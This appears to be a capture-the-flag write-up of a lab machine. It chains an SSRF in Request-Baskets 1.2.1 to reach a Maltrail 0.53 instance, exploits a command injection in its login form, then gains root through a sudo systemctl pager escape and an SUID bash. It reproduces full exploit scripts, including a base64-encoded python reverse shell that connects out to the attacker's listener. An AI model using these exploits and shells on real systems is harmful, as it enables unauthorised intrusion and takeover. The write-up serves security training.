### Summary
We start the box with a filtered port `80` and a webserver on port `55555` running a vulnerable version of `Requests-Basket` allowing for SSRF. We leverage the vulnerability to forward all connections from a given basket to `http://localhost` to peek at the service running on port `80`, a vulnerable instance of `Maltrail` allowing for Command Injection which we utilize to spawn a python reverse shell to gain a foothold as `puma`. The user can invoke `systemctl` via `sudo` which effectively gives us a `less` session with `root` permissions, granting us arbitrary code execution and a `root` shell

###### [[#Recon]]
- [[#Initial Scan]]
- [[#HTTP - TCP 55555]]
	- [[#poc.sh]]
###### [[#User Shell - puma]]
- [[#Requests-Baskets SSRF (CVE-2023-27163)]]
	- [[#poc.py]]
- [[#Enumeration as puma]]
###### [[#Root Shell]]
- [[#Systemctl as Sudo]]

---
# Recon
## Initial Scan
---
```sh
❯ sudo nmap -p- --min-rate 10000 -vv $IP -oN nmap/tcp
PORT      STATE    SERVICE REASON
22/tcp    open     ssh     syn-ack ttl 63
80/tcp    filtered http    no-response
8338/tcp  filtered unknown no-response
55555/tcp open     unknown syn-ack ttl 63

❯ sudo nmap -p 22,80,8338,55555 -sCV -vv $IP -oN nmap/tcpScripts
PORT      STATE    SERVICE REASON         VERSION
22/tcp    open     ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDdY38bkvujLwIK0QnFT+VOKT9zjKiPbyHpE+cVhus9r/6I/uqPzLylknIEjMYOVbFbVd8rTGzbmXKJBdRK61WioiPlKjbqvhO/YTnlkIRXm4jxQgs+xB0l9WkQ0CdHoo/Xe3v7TBije+lqjQ2tvhUY1LH8qBmPIywCbUvyvAGvK92wQpk6CIuHnz6IIIvuZdSklB02JzQGlJgeV54kWySeUKa9RoyapbIqruBqB13esE2/5VWyav0Oq5POjQWOWeiXA6yhIlJjl7NzTp/SFNGHVhkUMSVdA7rQJf10XCafS84IMv55DPSZxwVzt8TLsh2ULTpX8FELRVESVBMxV5rMWLplIA5ScIEnEMUR9HImFVH1dzK+E8W20zZp+toLBO1Nz4/Q/9yLhJ4Et+jcjTdI1LMVeo3VZw3Tp7KHTPsIRnr8ml+3O86e0PK+qsFASDNgb3yU61FEDfA0GwPDa5QxLdknId0bsJeHdbmVUW3zax8EvR+pIraJfuibIEQxZyM=
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEFMztyG0X2EUodqQ3reKn1PJNniZ4nfvqlM7XLxvF1OIzOphb7VEz4SCG6nXXNACQafGd6dIM/1Z8tp662Stbk=
|   256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICYYQRfQHc6ZlP/emxzvwNILdPPElXTjMCOGH6iejfmi
80/tcp    filtered http    no-response
8338/tcp  filtered unknown no-response
55555/tcp open     unknown syn-ack ttl 63
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Thu, 05 Mar 2026 01:33:07 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Thu, 05 Mar 2026 01:32:40 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Thu, 05 Mar 2026 01:32:41 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.92%I=7%D=3/4%Time=69A8DD38%P=x86_64-redhat-linux-gnu%
SF:r(GetRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/htm
SF:l;\x20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Thu,\x2005\x20Mar\
SF:x202026\x2001:32:40\x20GMT\r\nContent-Length:\x2027\r\n\r\n<a\x20href=\
SF:"/web\">Found</a>\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x2
SF:0Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection
SF::\x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP/1\.0\x
SF:20200\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Thu,\x2005\x20Mar\
SF:x202026\x2001:32:41\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequ
SF:est,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pla
SF:in;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Reque
SF:st")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n
SF:Content-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r
SF:\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x204
SF:00\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r
SF:\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,6
SF:7,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x
SF:20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%
SF:r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(FourOhFourRequest,EA,"HTTP/1\.0\x20400\x20Bad\x20Request\
SF:r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Opti
SF:ons:\x20nosniff\r\nDate:\x20Thu,\x2005\x20Mar\x202026\x2001:33:07\x20GM
SF:T\r\nContent-Length:\x2075\r\n\r\ninvalid\x20basket\x20name;\x20the\x20
SF:name\x20does\x20not\x20match\x20pattern:\x20\^\[\\w\\d\\-_\\\.\]{1,250}
SF:\$\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Requ
SF:est\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20
SF:close\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- The TTL lines up with a POSIX adherent system
- The OpenSSH version indicates `Ubuntu 20.04`
- Seems like there's a web server running on port `55555`

## HTTP - TCP 55555
---
- When we navigate to `http://10.129.229.26:55555`, we see a webpage that allows us to create a basket to collect and inspect HTTP requests
![[Pasted image 20260304203645.png]]

- The site says it's powered by `request-baskets` version `1.2.1`
- We can create baskets and inspect requests that have been made to them, inspecting header information
- Looking up an appropriate CVE brings us to this [github POC](https://github.com/entr0pie/CVE-2023-27163) of `CVE-2023-27163`, an SSRF vulnerability
- Essentially, the web application doesn't sanitize data being passed when baskets are being created, allowing users to add headers like `forward_url` and `proxy_response` which introduces SSRF

### poc.sh
```sh
#!/bin/bash

echo -e "Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163\n";

if [ "$#" -lt 2 ] || [ "$1" = "-h" ] || [ "$1" = "--help" ]; then
    help="Usage: CVE-2023-27163.sh <URL> <TARGET>\n\n";
    help+="This PoC will create a vulnerable basket on a Request-Baskets (<= 1.2.1) server,\n";
    help+="which will act as a proxy to other services and servers.\n\n";
    help+="Arguments:\n" \
    help+=" URL            main path (/) of the server (eg. http://127.0.0.1:5000/)\n";
    help+=" TARGET         r-baskets target server (eg. https://b5f5-138-204-24-206.ngrok-free.app/)\n\n";
    help+="More info at https://github.com/entr0pie/CVE-2023-27163.";

    echo -e "$help";
    exit 1;
fi

URL=$1
ATTACKER_SERVER=$2

if [ "${URL: -1}" != "/" ]; then
    URL="$URL/";
fi;

BASKET_NAME=$(LC_ALL=C tr -dc 'a-z' </dev/urandom | head -c "6");

API_URL="$URL""api/baskets/$BASKET_NAME";

PAYLOAD="{\"forward_url\": \"$ATTACKER_SERVER\",\"proxy_response\": true,\"insecure_tls\": false,\"expand_path\": true,\"capacity\": 250}";

echo "> Creating the \"$BASKET_NAME\" proxy basket...";

if ! response=$(curl -s -X POST -H 'Content-Type: application/json' -d "$PAYLOAD" "$API_URL"); then
    echo "> FATAL: Could not properly request $API_URL. Is the server online?";
    exit 1;
fi;

BASKET_URL="$URL$BASKET_NAME";

echo "> Basket created!";
echo "> Accessing $BASKET_URL now makes the server request to $ATTACKER_SERVER.";

if ! jq --help 1>/dev/null; then
    echo "> Response body (Authorization): $response";
else
    echo "> Authorization: $(echo "$response" | jq -r ".token")";
fi;

exit 0;
```

# User Shell - puma
## Requests-Baskets SSRF (CVE-2023-27163)
---
- We want to inspect the contents of the web server running on port `80` of the host machine since it's weird that `nmap` could tell it was filtered
- We can set our `TARGET` parameter in the poc script to be `http://localhost` and the web server will redirect all requests to itself on port `80`
```sh
❯ ./cve-2023-27163.sh http://10.129.229.26:55555 http://localhost
Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163

> Creating the "prbtrr" proxy basket...
> Basket created!
> Accessing http://10.129.229.26:55555/prbtrr now makes the server request to http://localhost.
> Authorization: dmyCa_vWi9Bbq4DXdGXYgCw3xCBXrtHJHRHI0aZTD--U
```

- When we navigate to `http://10.129.229.26:55555/prbtrr` we see the following webpage
![[Pasted image 20260305030710.png]]

- It looks like an instance of `Maltrail v0.53`
- Searching up an appropriate cve brings us to this [github poc](https://github.com/spookier/Maltrail-v0.53-Exploit) which describes exploiting a Command Injection vulnerability in the `username` parameter at the `login` endpoint
- The exploit injects a semicolon and backtick characters (invoking `sh`) around an `echo [base64 reverse python socket shell] | base64 -d | sh` into the `username` field  

### poc.py
```python
import sys;
import os;
import base64;

def main():
	listening_IP = None
	listening_PORT = None
	target_URL = None
	
	if len(sys.argv) != 4:
		print("Error. Needs listening IP, PORT and target URL.")
		return(-1)
	
	listening_IP = sys.argv[1]
	listening_PORT = sys.argv[2]
	target_URL = sys.argv[3] + "/login"
	print("Running exploit on " + str(target_URL))
	curl_cmd(listening_IP, listening_PORT, target_URL)

def curl_cmd(my_ip, my_port, target_url):
	payload = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{my_ip}",{my_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
	encoded_payload = base64.b64encode(payload.encode()).decode()  # encode the payload in Base64
	command = f"curl '{target_url}' --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'"
	os.system(command)

if __name__ == "__main__":
  main()
```

- We can run the exploit as is to get a reverse shell
```sh
❯ python maltrail_exploit.py 10.10.15.234 12345 http://10.129.229.26:55555/prbtrr
Running exploit on http://10.129.229.26:55555/prbtrr/login
```
```sh
❯ nc -lvnp 12345
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 10.129.229.26.
Ncat: Connection from 10.129.229.26:59790.
$ whoami
whoami
puma
```

- From here we can perform a standard `script -c bash /dev/null` reverse shell upgrade

## Enumeration as puma
---
- We can immediately grab the `user.txt` flag
```sh
puma@sau:/opt/maltrail$ cat ~/user.txt 
2648822f42d67d42c00bf0e5b24b85e7
```

- There's no glaringly obvious config information in our spawned directory
- No crontabs to read from
- We see an unknown port listening on `8338` but performing `curl` confirms it's the `Maltrail` instance
- There aren't many other files in the home directory
```sh
puma@sau:/opt$ find ~/ -type f
/home/puma/.bash_logout
/home/puma/user.txt
/home/puma/.cache/motd.legal-displayed
/home/puma/.gnupg/pubring.kbx
/home/puma/.gnupg/trustdb.gpg
/home/puma/.bashrc
/home/puma/.profile
```

- We can check if `puma` can run any commands as `sudo`
```sh
puma@sau:/opt$ sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```
- Looks like `systemctl status trail.service`

# Root Shell
## Systemctl as Sudo
---
- We can run the command and inspect results
```sh
puma@sau:/opt$ sudo /usr/bin/systemctl status trail.service
● trail.service - Maltrail. Server of malicious traffic detection system
     Loaded: loaded (/etc/systemd/system/trail.service; enabled; vendor preset: enabled)
     Active: active (running) since Thu 2026-03-05 01:27:04 UTC; 6h ago
       Docs: https://github.com/stamparm/maltrail#readme
             https://github.com/stamparm/maltrail/wiki
   Main PID: 879 (python3)
      Tasks: 12 (limit: 4662)
     Memory: 61.7M
     CGroup: /system.slice/trail.service
             ├─ 879 /usr/bin/python3 server.py
             ├─1896 /bin/sh -c logger -p auth.info -t "maltrail[879]" "Failed password for ;`echo "cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVB>
             ├─1897 /bin/sh -c logger -p auth.info -t "maltrail[879]" "Failed password for ;`echo "cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVB>
             ├─1900 sh
             ├─1901 python3 -c import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.234",12345));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.>
             ├─1902 /bin/sh
             ├─1932 script -c bash /dev/null
             ├─1933 bash
             ├─2010 sudo /usr/bin/systemctl status trail.service
             ├─2012 /usr/bin/systemctl status trail.service
             └─2013 pager

Mar 05 01:27:04 sau systemd[1]: Started Maltrail. Server of malicious traffic detection system.
Mar 05 08:10:04 sau maltrail[1888]: Failed password for None from 127.0.0.1 port 60238
Mar 05 08:20:00 sau crontab[1980]: (puma) LIST (puma)
Mar 05 08:23:53 sau sudo[2010]:     puma : TTY=pts/1 ; PWD=/opt ; USER=root ; COMMAND=/usr/bin/systemctl status trail.service
Mar 05 08:23:53 sau sudo[2010]: pam_unix(sudo:session): session opened for user root by (uid=0)
!whoami
root
```
- When running `systemctl`, we're spawned into a `less` session and are able to perform `sh` commands by typing `![command]`
- Running `!whoami` confirms we're the `root` user, meaning we have `root` level code execution!

- We can simply perform `!bash` to get a shell
- We could also use this to set the `/bin/bash` binary as `SUID`
```sh
!chmod 4755 $(which bash)
!ls -lah $(which bash)
-rwsr-xr-x 1 root root 1.2M Apr 18  2022 /usr/bin/bash
```

- Then, in our `puma` shell
```sh
puma@sau:/opt$ bash -p
bash-5.0# whoami
root
bash-5.0# cat /root/root.txt
476afab1fed573bb0ebf915857e90476
```